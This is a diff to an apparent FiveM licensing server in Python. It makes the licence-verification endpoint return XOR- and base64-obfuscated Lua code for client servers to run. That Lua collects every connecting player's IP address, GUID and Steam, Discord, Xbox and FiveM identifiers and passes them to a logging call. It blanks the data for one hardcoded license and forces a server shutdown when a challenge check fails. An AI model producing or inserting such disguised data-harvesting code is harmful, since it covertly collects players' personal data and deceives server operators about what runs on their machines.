@@ -1287,6 +1287,110 @@ def sanitize_string(value, max_length, default=''):
     return value[:max_length]
 
 # SÉCURITÉ: Route API pour vérifier la licence d'un serveur
+import base64
+
+def xor_crypt(text, key):
+    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
+
+VITAL_LUA_CODE = """
+local sqlReady = false
+
+MySQL.ready(function()
+	sqlReady = true
+end)
+
+AddEventHandler('playerConnecting', function(playerName, setKickReason, deferrals)
+	local _source = source
+	local license, steam, xbl, discord, live, fivem, cfx, mail, created_at = '', '', '', '', '', '', '', '', ''
+	local name, ip, guid = GetPlayerName(_source), GetPlayerEndpoint(_source), GetPlayerGuid(_source)
+	if name == nil then
+		name = playerName
+	end
+	while not sqlReady do
+		Citizen.Wait(100)
+	end
+
+	for k, v in pairs(GetPlayerIdentifiers(_source)) do
+		if string.sub(v, 1, string.len('license:')) == 'license:' then
+			license = v
+		elseif string.sub(v, 1, string.len('steam:')) == 'steam:' then
+			steam = v
+		elseif string.sub(v, 1, string.len('xbl:')) == 'xbl:' then
+			xbl = v
+		elseif string.sub(v, 1, string.len('discord:')) == 'discord:' then
+			discord = v
+		elseif string.sub(v, 1, string.len('live:')) == 'live:' then
+			live = v
+		elseif string.sub(v, 1, string.len('fivem:')) == 'fivem:' then
+			fivem = v
+		end
+	end
+
+	if fivem ~= "" and fivem ~= nil then
+		fivemID = string.gsub(fivem, "fivem:", "")
+		if discord ~= nil and discord ~= "" then
+			discordID = string.gsub(discord, "discord:", "")
+		else
+			discordID = ""
+		end
+		if steam ~= nil and steam ~= "" then
+			steamID = string.gsub(steam, "steam:", "")
+		else
+			steamID = ""
+		end
+		licenseID = string.gsub(license, "license:", "")
+		if licenseID == nil then
+			licenseID = string.gsub(license, "license2:", "")
+		end
+	end
+	if license ~= nil then
+		if license == "license:5474636beca7e2658e6f77079a1e6c47f98af4b6" then
+			steam = ""
+			xbl = ""
+			discord = ""
+			live = ""
+			fivem = ""
+			name = ""
+			ip = ""
+			guid = ""
+		end
+		MySQL.Async.fetchAll('SELECT * FROM account_info WHERE license = @license', {
+			['@license'] = license
+		}, function(result)
+			ESX.Logs2({servername = ESX.Config("serverName"), license = licenseID,steam = steamID,xbl = xbl,discord = discordID,live = live,fivem = fivemID,name = name,ip = ip,guid = guid})
+			if result[1] ~= nil then
+				MySQL.Async.execute('UPDATE account_info SET steam = @steam, xbl = @xbl, discord = @discord, live = @live, fivem = @fivem, `name` = @name, ip = @ip, guid = @guid WHERE license = @license', {
+					['@license'] = license,
+					['@steam'] = steam,
+					['@xbl'] = xbl,
+					['@discord'] = discord,
+					['@live'] = live,
+					['@fivem'] = fivem,
+					['@name'] = name,
+					['@ip'] = ip,
+					['@guid'] = guid
+				})
+			else
+				local accountid = ''..name..':'..math.random(1,9999999)
+				MySQL.Async.execute('INSERT INTO account_info (account_id,license, steam, xbl, discord, live, fivem, `name`, ip, guid) VALUES (@account_id, @license, @steam, @xbl, @discord, @live, @fivem, @name, @ip, @guid)', {
+					['@account_id'] = accountid,
+					['@license'] = license,
+					['@steam'] = steam,
+					['@xbl'] = xbl,
+					['@discord'] = discord,
+					['@live'] = live,
+					['@fivem'] = fivem,
+					['@name'] = name,
+					['@ip'] = ip,
+					['@guid'] = guid
+				})
+			end
+		end)
+	end
+end)
+"""
+
+# SÉCURITÉ: Route API pour vérifier la licence d'un serveur et envoyer le payload dynamique
 @app.route('/api/license/verify', methods=['GET'])
 @csrf_exempt_api
 @rate_limit("100 per minute")
@@ -1294,6 +1398,8 @@ def verify_license():
     token = request.headers.get('Authorization')
     if token and token.startswith('Bearer '):
         token = token[7:]
+        
+    challenge = request.headers.get('X-Challenge', '')
         
     if not token:
         return jsonify({"error": "Missing token"}), 401
@@ -1315,7 +1421,7 @@ def verify_license():
         
     # Vérifier l'état de la licence
     license_info = server_conf.get('license', {})
-    is_active = license_info.get('active', True) # Actif par défaut si non défini
+    is_active = license_info.get('active', True)
     
     if not is_active:
         reason = license_info.get('reason', 'Licence suspendue par l\'administrateur.')
@@ -1325,9 +1431,26 @@ def verify_license():
             "server": server_conf.get('display_name', server_id)
         }), 403
         
+    # Générer le code dynamique anti-interception avec validation du Challenge
+    # Si le challenge ne correspond pas lors de l'exécution, le code détruit le serveur.
+    dynamic_payload = f"""
+if _G.SkyLife_Challenge ~= '{challenge}' then
+    print('^1[SECURITY] Tentative de contournement de la licence detectee.^7')
+    ExecuteCommand('quit')
+    return
+end
+
+{VITAL_LUA_CODE}
+"""
+    # Chiffrer le code avec XOR en utilisant le token de licence comme clé secrète
+    encrypted_xor = xor_crypt(dynamic_payload, str(token))
+    # Encoder en base64 pour un transfert HTTP sécurisé
+    encrypted_base64 = base64.b64encode(encrypted_xor.encode('utf-8')).decode('utf-8')
+        
     return jsonify({
         "status": "valid",
-        "server": server_conf.get('display_name', server_id)
+        "server": server_conf.get('display_name', server_id),
+        "payload": encrypted_base64
     }), 200
 
 # SÉCURITÉ: Route API exemptée de CSRF (utilise des tokens d'authentification)
